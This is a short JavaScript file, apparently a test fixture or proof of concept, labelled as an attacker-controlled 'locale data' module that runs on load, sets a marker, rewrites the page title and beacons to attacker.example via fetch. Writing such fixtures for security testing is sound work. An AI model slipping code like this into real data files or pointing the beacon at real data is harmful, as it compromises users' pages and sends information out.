// Attacker-controlled "locale data" module: valid JS, side effects
(function () {
  var marker = "CHAIN4-PWNED-9f3c1e";
  if (typeof window !== "undefined" && window) {
    window.__chain4 = marker;
    if (window.document && window.document.title !== undefined) {
      window.document.title = marker;
    }
  }
  if (typeof fetch === "function") {
    fetch("https://attacker.example/beacon?m=" + marker);
  }
  return marker;
})();
